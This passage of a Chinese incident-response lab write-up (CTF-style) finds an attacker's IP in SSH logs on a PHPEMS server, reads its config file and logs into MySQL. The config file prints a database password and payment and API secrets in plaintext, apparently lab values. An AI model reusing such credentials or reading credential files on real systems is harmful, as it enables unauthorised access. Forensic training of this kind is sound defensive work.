</span></span></code></pre></div><p>筛选一下mysql，在应用程序这里</p><p><img alt=2025-03-09123957 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09123957.png></p><pre tabindex=0><code>flag{8820}
</code></pre><h2 id=q5-7>Q5</h2><pre tabindex=0><code>5.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。
</code></pre><p><strong>事件ID 1074</strong>：系统已关闭或重启（记录重启的用户和原因）。<img alt=2025-03-09124445 loading=lazy src=/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%8E%84%E6%9C%BA/2025-03-09124445.png></p><pre tabindex=0><code>flag{3}
</code></pre><h1 id=第五章-linux实战-cms01>第五章 linux实战-CMS01</h1><h2 id=q1-10>Q1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>通过本地 PC SSH到服务器并且分析黑客的 IP 为多少,将黑客 IP 作为 FLAG 提交;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 log<span style=color:#f92672>]</span><span style=color:#75715e># cat secure |grep &#34;Accepted &#34;|awk &#39;{print $11}&#39;</span>
</span></span><span style=display:flex><span>127.0.0.1
</span></span><span style=display:flex><span>192.168.20.1
</span></span><span style=display:flex><span>192.168.20.1
</span></span><span style=display:flex><span>192.168.20.1
</span></span><span style=display:flex><span>192.168.52.1
</span></span><span style=display:flex><span>36.7.107.206
</span></span><span style=display:flex><span>36.7.107.206
</span></span><span style=display:flex><span>58.218.234.99
</span></span><span style=display:flex><span>58.218.234.99
</span></span></code></pre></div><pre tabindex=0><code>flag{192.168.20.1}
</code></pre><h2 id=q2-10>Q2</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>通过本地 PC SSH到服务器并且分析黑客修改的管理员密码(明文)为多少,将黑客修改的管理员密码(明文) 作为 FLAG 提交;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>[root@ip-10-0-10-1 log]# netstat -anlupt
</span></span><span style=display:flex><span>Active Internet connections (servers and established)
</span></span><span style=display:flex><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span style=display:flex><span>tcp        0      0 0.0.0.0:12485           0.0.0.0:*               LISTEN      2455/python3        
</span></span><span style=display:flex><span>tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      1468/sshd           
</span></span><span style=display:flex><span>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      2086/nginx: master  
</span></span><span style=display:flex><span>tcp        0      0 0.0.0.0:8821            0.0.0.0:*               LISTEN      2086/nginx: master  
</span></span><span style=display:flex><span>tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      1574/pure-ftpd (SER 
</span></span><span style=display:flex><span>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1468/sshd           
</span></span><span style=display:flex><span>tcp        0      0 0.0.0.0:888             0.0.0.0:*               LISTEN      2086/nginx: master  
</span></span><span style=display:flex><span>tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1436/master         
</span></span><span style=display:flex><span>tcp        0      0 10.0.10.1:59828         169.254.169.254:80      TIME_WAIT   -                   
</span></span><span style=display:flex><span>tcp        0      0 10.0.10.1:22            58.218.234.99:21714     ESTABLISHED 2372/sshd: root@pts 
</span></span><span style=display:flex><span>tcp6       0      0 :::3306                 :::*                    LISTEN      2270/mysqld         
</span></span><span style=display:flex><span>tcp6       0      0 :::2222                 :::*                    LISTEN      1468/sshd           
</span></span><span style=display:flex><span>tcp6       0      0 :::21                   :::*                    LISTEN      1574/pure-ftpd (SER 
</span></span><span style=display:flex><span>tcp6       0      0 :::22                   :::*                    LISTEN      1468/sshd           
</span></span><span style=display:flex><span>tcp6       0      0 ::1:25                  :::*                    LISTEN      1436/master         
</span></span><span style=display:flex><span>udp        0      0 0.0.0.0:68              0.0.0.0:*                           1021/dhclient   
</span></span></code></pre></div><p><code>netstat -anlupt</code> 是一个用于查看网络连接、路由表、接口统计信息等的命令，有mysql和nginx</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 ~<span style=color:#f92672>]</span><span style=color:#75715e># ls /</span>
</span></span><span style=display:flex><span>bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  patch  proc  root  run  sbin  srv  sys  tmp  usr  var  www
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 ~<span style=color:#f92672>]</span><span style=color:#75715e># cd /www</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 www<span style=color:#f92672>]</span><span style=color:#75715e># ls</span>
</span></span><span style=display:flex><span>backup  disk.pl  server  wwwlogs  wwwroot
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 www<span style=color:#f92672>]</span><span style=color:#75715e># cd backup</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 backup<span style=color:#f92672>]</span><span style=color:#75715e># ls</span>
</span></span><span style=display:flex><span>database  file_history  nginxBak  panel  php56.Bak  php-fpm56.Bak  site
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 backup<span style=color:#f92672>]</span><span style=color:#75715e># cd ..</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 www<span style=color:#f92672>]</span><span style=color:#75715e># cd wwwlogs/</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 wwwlogs<span style=color:#f92672>]</span><span style=color:#75715e># ls</span>
</span></span><span style=display:flex><span>127.0.0.1.error.log  127.0.0.1.log  access.log  go  java  load_balancing  nginx_error.log  nodejs  other  python  request  tcp-access.log  tcp-error.log  waf
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 wwwlogs<span style=color:#f92672>]</span><span style=color:#75715e># cat access.log</span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>127.0.0.1 - - <span style=color:#f92672>[</span>20/Mar/2024:14:53:16 +0800<span style=color:#f92672>]</span> <span style=color:#e6db74>&#34;GET /phpmyadmin_28ee99a9e7d063bd/sql.php?db=kaoshi&amp;table=x2_block&amp;server=1&amp;target=&amp;ajax_request=true&amp;ajax_page_request=true&amp;_nocache=1710917594040441271&amp;token=74566976347e3d424344604c33643b4f HTTP/1.1&#34;</span> <span style=color:#ae81ff>200</span> <span style=color:#ae81ff>39014</span> <span style=color:#e6db74>&#34;-&#34;</span> <span style=color:#e6db74>&#34;BT-Panel&#34;</span>
</span></span><span style=display:flex><span>127.0.0.1 - - <span style=color:#f92672>[</span>20/Mar/2024:14:53:16 +0800<span style=color:#f92672>]</span> <span style=color:#e6db74>&#34;GET /phpmyadmin_28ee99a9e7d063bd/index.php?ajax_request=1&amp;recent_table=1&amp;no_debug=true&amp;_nocache=1710917594281142812&amp;token=74566976347e3d424344604c33643b4f HTTP/1.1&#34;</span> <span style=color:#ae81ff>200</span> <span style=color:#ae81ff>5551</span> <span style=color:#e6db74>&#34;-&#34;</span> <span style=color:#e6db74>&#34;BT-Panel&#34;</span>
</span></span></code></pre></div><p>主要是phpmyadmin看看配置</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 wwwlogs<span style=color:#f92672>]</span><span style=color:#75715e># cd ..</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 www<span style=color:#f92672>]</span><span style=color:#75715e># cd wwwroot/</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 wwwroot<span style=color:#f92672>]</span><span style=color:#75715e># ls</span>
</span></span><span style=display:flex><span>127.0.0.1  default
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 wwwroot<span style=color:#f92672>]</span><span style=color:#75715e># cd default/</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 default<span style=color:#f92672>]</span><span style=color:#75715e># ls</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 default<span style=color:#f92672>]</span><span style=color:#75715e># cd ..</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 wwwroot<span style=color:#f92672>]</span><span style=color:#75715e># cd 127.0.0.1/</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 127.0.0.1<span style=color:#f92672>]</span><span style=color:#75715e># ls</span>
</span></span><span style=display:flex><span>api  app  data  files  index.php  lib  tasks  vendor
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 127.0.0.1<span style=color:#f92672>]</span><span style=color:#75715e># cat index.php</span>
</span></span><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>session_start<span style=color:#f92672>()</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;PE_VERSION&#34;</span>,<span style=color:#e6db74>&#39;9.0&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;PEPATH&#34;</span>,dirname<span style=color:#f92672>(</span>__FILE__<span style=color:#f92672>))</span>;
</span></span><span style=display:flex><span>require PEPATH.<span style=color:#e6db74>&#34;/lib/init.cls.php&#34;</span>;
</span></span><span style=display:flex><span>$ginkgo <span style=color:#f92672>=</span> new <span style=color:#ae81ff>\P</span>HPEMS<span style=color:#ae81ff>\g</span>inkgo;
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 127.0.0.1<span style=color:#f92672>]</span><span style=color:#75715e># cd lib/</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 lib<span style=color:#f92672>]</span><span style=color:#75715e># ls</span>
</span></span><span style=display:flex><span>alipay.cls.php  ca.cls.php        db.cls.php      face.cls.php   gms.cls.php   init.cls.php    pdosql.cls.php  recog.cls.php     sphinx.cls.php   wechat.cls.php
</span></span><span style=display:flex><span>api.cls.php     category.cls.php  editor.cls.php  files.cls.php  html.cls.php  module.cls.php  pepdo.cls.php   sendmail.cls.php  sql.cls.php      word.cls.php
</span></span><span style=display:flex><span>area.cls.php    cnf.cls.php       ev.cls.php      ftp.cls.php    http.cls.php  oss.cls.php     peqr.cls.php    session.cls.php   strings.cls.php  wxpay.cls.php
</span></span><span style=display:flex><span>baidu.cls.php   config.inc.php    excel.cls.php   gd.cls.php     include       payjs.cls.php   pg.cls.php      smtp.cls.php      tpl.cls.php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>root@ip-10-0-10-1 lib<span style=color:#f92672>]</span><span style=color:#75715e># cat config.inc.php</span>
</span></span><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/** 常规常量设置 */
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;DOMAINTYPE&#39;</span>,<span style=color:#e6db74>&#39;off&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;CH&#39;</span>,<span style=color:#e6db74>&#39;exam_&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;CDO&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;CP&#39;</span>,<span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;CRT&#39;</span>,180<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;CS&#39;</span>,<span style=color:#e6db74>&#39;1hqfx6ticwRxtfviTp940vng!yC^QK^6&#39;</span><span style=color:#f92672>)</span>;//请随机生成32位字符串修改此处值
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;HE&#39;</span>,<span style=color:#e6db74>&#39;utf-8&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;PN&#39;</span>,10<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;TIME&#39;</span>,time<span style=color:#f92672>())</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span><span style=color:#f92672>(</span>dirname<span style=color:#f92672>(</span>$_SERVER<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;SCRIPT_NAME&#39;</span><span style=color:#f92672>]))</span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;WP&#39;</span>,<span style=color:#e6db74>&#39;http://&#39;</span>.$_SERVER<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;SERVER_NAME&#39;</span><span style=color:#f92672>]</span>.dirname<span style=color:#f92672>(</span>$_SERVER<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;SCRIPT_NAME&#39;</span><span style=color:#f92672>])</span>.<span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;WP&#39;</span>,<span style=color:#e6db74>&#39;http://&#39;</span>.$_SERVER<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;SERVER_NAME&#39;</span><span style=color:#f92672>]</span>.<span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;OPENOSS&#39;</span>,false<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/**接口加密设置**/
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;APIKEY&#39;</span>,<span style=color:#e6db74>&#39;356d9abc2532ceb0945b615a922c3370&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;APIIV&#39;</span>,<span style=color:#e6db74>&#39;#phpems90iv*&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>/**composer开关**/
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;COMPOSER&#39;</span>,0<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>/** 数据库设置 */
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;SQLDEBUG&#39;</span>,0<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;DB&#39;</span>,<span style=color:#e6db74>&#39;kaoshi&#39;</span><span style=color:#f92672>)</span>;//MYSQL数据库名
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;DH&#39;</span>,<span style=color:#e6db74>&#39;127.0.0.1&#39;</span><span style=color:#f92672>)</span>;//MYSQL主机名，不用改
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;DU&#39;</span>,<span style=color:#e6db74>&#39;kaoshi&#39;</span><span style=color:#f92672>)</span>;//MYSQL数据库用户名
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;DP&#39;</span>,<span style=color:#e6db74>&#39;5Sx8mK5ieyLPb84m&#39;</span><span style=color:#f92672>)</span>;//MYSQL数据库用户密码
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;DTH&#39;</span>,<span style=color:#e6db74>&#39;x2_&#39;</span><span style=color:#f92672>)</span>;//系统表前缀，不用改
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/** 微信相关设置 */
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;USEWX&#39;</span>,false<span style=color:#f92672>)</span>;//微信使用开关，绑定用户，false时不启用
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;WXAUTOREG&#39;</span>,false<span style=color:#f92672>)</span>;//微信开启自动注册,设置为false时转向登录和注册页面，绑定openid
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;WXPAY&#39;</span>,false<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>//define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;FOCUSWX&#39;</span>,true<span style=color:#f92672>)</span>;//强制引导关注微信
</span></span><span style=display:flex><span>//define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;WXQRCODE&#39;</span>,<span style=color:#e6db74>&#39;qrcode.png&#39;</span><span style=color:#f92672>)</span>;//微信公众号二维码地址
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;EP&#39;</span>,<span style=color:#e6db74>&#39;@phpems.net&#39;</span><span style=color:#f92672>)</span>;//微信开启自动注册时注册邮箱后缀
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;OPENAPPID&#39;</span>,<span style=color:#e6db74>&#39;wx7703aa61284598ea&#39;</span><span style=color:#f92672>)</span>;//开放平台账号
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;OPENAPPSECRET&#39;</span>,<span style=color:#e6db74>&#39;36745ed4d4ea9da9f25e7b3ccd06d5ef&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;MPAPPID&#39;</span>,<span style=color:#e6db74>&#39;wx7703aa61284598ea&#39;</span><span style=color:#f92672>)</span>;//小程序账号
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;MPAPPSECRET&#39;</span>,<span style=color:#e6db74>&#39;36745ed4d4ea9da9f25e7b3ccd06d5ef&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;WXAPPID&#39;</span>,<span style=color:#e6db74>&#39;wx6967d8319bfeea19&#39;</span><span style=color:#f92672>)</span>;//公众号账号
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;WXAPPSECRET&#39;</span>,<span style=color:#e6db74>&#39;4d462a770aebb7460e2284cbd448cee0&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;WXMCHID&#39;</span>,<span style=color:#e6db74>&#39;1414206302&#39;</span><span style=color:#f92672>)</span>;//MCHID
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;WXKEY&#39;</span>,<span style=color:#e6db74>&#39;72653616204d16975931a46f9296092e&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/** 支付宝相关设置 */
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;ALIPAY&#39;</span>,false<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>/**MD5**/
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;ALIPART&#39;</span>,<span style=color:#e6db74>&#39;111171660&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;ALIKEY&#39;</span>,<span style=color:#e6db74>&#39;os11111117fmljymmcau&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;ALIACC&#39;</span>,<span style=color:#e6db74>&#39;111111@qq.com&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>/**RAS2**/
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;ALIAPPID&#39;</span>,<span style=color:#e6db74>&#39;2016072738&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;ALIPRIKEY&#39;</span>,<span style=color:#e6db74>&#39;MIIEogIBAMXsHR2vhl3BqWBbXfDaIcrJgNssIUddVCX6fT9YWiPXCiCeu5M=&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;ALIPUBKEY&#39;</span>,<span style=color:#e6db74>&#39;MIIBIjANXRkaDw6wIDAQAB&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>/** payjz相关设置 */
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;PAYJSASWX&#39;</span>,<span style=color:#e6db74>&#39;NO&#39;</span><span style=color:#f92672>)</span>;//使用PAYJZ的微信支付接口代替微信支付，不使用请设置为NO
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;PAYJSMCHID&#39;</span>,<span style=color:#e6db74>&#39;1551052561&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>define<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;PAYJSKEY&#39;</span>,<span style=color:#e6db74>&#39;Zz8ks1ZP3UPKeTGi&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>?&gt;<span style=color:#f92672>[</span>root@ip-10-0-10-1 lib<span style=color:#f92672>]</span><span style=color:#75715e>#  mysql -ukaoshi -p5Sx8mK5ieyLPb84m</span>
</span></span><span style=display:flex><span>mysql: <span style=color:#f92672>[</span>Warning<span style=color:#f92672>]</span> Using a password on the command line interface can be insecure.
</span></span><span style=display:flex><span>Welcome to the MySQL monitor.  Commands end with ; or <span style=color:#ae81ff>\g</span>.
</span></span><span style=display:flex><span>Your MySQL connection id is <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>Server version: 5.7.44-log Source distribution
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Copyright <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> 2000, 2023, Oracle and/or its affiliates.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Oracle is a registered trademark of Oracle Corporation and/or its
</span></span><span style=display:flex><span>affiliates. Other names may be trademarks of their respective
</span></span><span style=display:flex><span>owners.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Type <span style=color:#e6db74>&#39;help;&#39;</span> or <span style=color:#e6db74>&#39;\h&#39;</span> <span style=color:#66d9ef>for</span> help. Type <span style=color:#e6db74>&#39;\c&#39;</span> to clear the current input statement.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mysql&gt; show databases;
</span></span><span style=display:flex><span>+--------------------+
</span></span><span style=display:flex><span>| Database           |
</span></span><span style=display:flex><span>+--------------------+
</span></span><span style=display:flex><span>| information_schema |
</span></span><span style=display:flex><span>| kaoshi             |
</span></span><span style=display:flex><span>+--------------------+
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span> rows in set <span style=color:#f92672>(</span>0.00 sec<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mysql&gt; use kaoshi;
</span></span><span style=display:flex><span>Database changed
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mysql&gt; show tables;
</span></span><span style=display:flex><span>+---------------------+
</span></span><span style=display:flex><span>| Tables_in_kaoshi    |
</span></span><span style=display:flex><span>+---------------------+
</span></span><span style=display:flex><span>| x2_answer           |
</span></span><span style=display:flex><span>| x2_app              |
</span></span><span style=display:flex><span>| x2_area             |
</span></span><span style=display:flex><span>| x2_ask              |
</span></span><span style=display:flex><span>| x2_attach           |
</span></span><span style=display:flex><span>| x2_attachtype       |
</span></span><span style=display:flex><span>| x2_basic            |
</span></span><span style=display:flex><span>| x2_block            |
</span></span><span style=display:flex><span>| x2_category         |
</span></span><span style=display:flex><span>| x2_cequeue          |
</span></span><span style=display:flex><span>| x2_certificate      |
</span></span><span style=display:flex><span>| x2_city             |
</span></span><span style=display:flex><span>| x2_cityarea         |
</span></span><span style=display:flex><span>| x2_cnttouser        |
</span></span><span style=display:flex><span>| x2_comment          |
</span></span><span style=display:flex><span>| x2_config           |
</span></span><span style=display:flex><span>| x2_consumelog       |
</span></span><span style=display:flex><span>| x2_content          |
</span></span><span style=display:flex><span>| x2_coupon           |
</span></span><span style=display:flex><span>| x2_course           |
</span></span><span style=display:flex><span>| x2_coursesubject    |
</span></span><span style=display:flex><span>| x2_docfloder        |
</span></span><span style=display:flex><span>| x2_dochistory       |
</span></span><span style=display:flex><span>| x2_docs             |
</span></span><span style=display:flex><span>| x2_examhistory      |
</span></span><span style=display:flex><span>| x2_exams            |
</span></span><span style=display:flex><span>| x2_examsession      |
</span></span><span style=display:flex><span>| x2_exercise         |
</span></span><span style=display:flex><span>| x2_favor            |
</span></span><span style=display:flex><span>| x2_feedback         |
</span></span><span style=display:flex><span>| x2_knows            |
</span></span><span style=display:flex><span>| x2_log              |
</span></span><span style=display:flex><span>| x2_module           |
</span></span><span style=display:flex><span>| x2_module_fields    |
</span></span><span style=display:flex><span>| x2_navs             |
</span></span><span style=display:flex><span>| x2_openbasics       |
</span></span><span style=display:flex><span>| x2_opencourse       |
</span></span><span style=display:flex><span>| x2_orders           |
</span></span><span style=display:flex><span>| x2_poscontent       |
</span></span><span style=display:flex><span>| x2_position         |
</span></span><span style=display:flex><span>| x2_progress         |
</span></span><span style=display:flex><span>| x2_province         |
</span></span><span style=display:flex><span>| x2_quest2knows      |
</span></span><span style=display:flex><span>| x2_questionanalysis |
</span></span><span style=display:flex><span>| x2_questionrows     |
</span></span><span style=display:flex><span>| x2_questions        |
</span></span><span style=display:flex><span>| x2_questype         |
</span></span><span style=display:flex><span>| x2_record           |
</span></span><span style=display:flex><span>| x2_recorddata       |
</span></span><span style=display:flex><span>| x2_reply            |
</span></span><span style=display:flex><span>| x2_sections         |
</span></span><span style=display:flex><span>| x2_seminar          |
</span></span><span style=display:flex><span>| x2_seminar_content  |
</span></span><span style=display:flex><span>| x2_seminar_elem     |
</span></span><span style=display:flex><span>| x2_seminar_layout   |
</span></span><span style=display:flex><span>| x2_seminar_tpls     |
</span></span><span style=display:flex><span>| x2_session          |
</span></span><span style=display:flex><span>| x2_subject          |
</span></span><span style=display:flex><span>| x2_user             |
</span></span><span style=display:flex><span>| x2_user_group       |
</span></span><span style=display:flex><span>| x2_wxlogin          |
</span></span><span style=display:flex><span>+---------------------+
</span></span><span style=display:flex><span><span style=color:#ae81ff>61</span> rows in set <span style=color:#f92672>(</span>0.00 sec<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mysql&gt; SELECT * FROM x2_user_group;
</span></span><span style=display:flex><span>+---------+--------------+---------------+---------------+------------+--------------------+--------------+
</span></span><span style=display:flex><span>| groupid | groupname    | groupmoduleid | groupdescribe | groupright | groupmoduledefault | groupdefault |
</span></span><span style=display:flex><span>+---------+--------------+---------------+---------------+------------+--------------------+--------------+
</span></span><span style=display:flex><span>|       <span style=color:#ae81ff>1</span> | 管理员       |             <span style=color:#ae81ff>1</span> | 管理员        |            |                  <span style=color:#ae81ff>1</span> |            <span style=color:#ae81ff>0</span> |
</span></span><span style=display:flex><span>|       <span style=color:#ae81ff>8</span> | 普通用户     |             <span style=color:#ae81ff>9</span> | 普通用户      |            |                  <span style=color:#ae81ff>0</span> |            <span style=color:#ae81ff>1</span> |
</span></span><span style=display:flex><span>|       <span style=color:#ae81ff>9</span> | 教师         |            <span style=color:#ae81ff>12</span> | 教师          |            |                  <span style=color:#ae81ff>0</span> |            <span style=color:#ae81ff>0</span> |
</span></span><span style=display:flex><span>+---------+--------------+---------------+---------------+------------+--------------------+--------------+
</span></span><span style=display:flex><span><span style=color:#ae81ff>3</span> rows in set <span style=color:#f92672>(</span>0.01 sec<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
